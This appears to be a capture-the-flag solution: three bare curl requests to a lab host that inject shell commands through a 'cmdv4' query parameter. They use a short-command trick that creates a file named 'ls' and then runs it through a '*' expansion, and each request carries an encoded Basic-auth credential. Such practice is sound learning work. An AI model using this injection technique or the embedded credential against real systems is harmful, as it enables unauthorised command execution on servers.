curl 'http://restricted.codectf.localos.io/4d5c4dc9ec15aacb1a7422770ecb9ec7/?cleanup=yes&cmdv4=ls' -H "Authorization: Basic dXNlcjpxOEtmWXJQQlBRZTJ1SUpaU1pQVkVObk4rWUQ5WXhvKzdMK2VlMjJrMlFRPQ=="

curl 'http://restricted.codectf.localos.io/4d5c4dc9ec15aacb1a7422770ecb9ec7/?cleanup=no&check=no&cmdv4=>ls' -H "Authorization: Basic dXNlcjpxOEtmWXJQQlBRZTJ1SUpaU1pQVkVObk4rWUQ5WXhvKzdMK2VlMjJrMlFRPQ=="

curl 'http://restricted.codectf.localos.io/4d5c4dc9ec15aacb1a7422770ecb9ec7/?cleanup=no&check=no&cmdv4=*%20' -H "Authorization: Basic dXNlcjpxOEtmWXJQQlBRZTJ1SUpaU1pQVkVObk4rWUQ5WXhvKzdMK2VlMjJrMlFRPQ=="
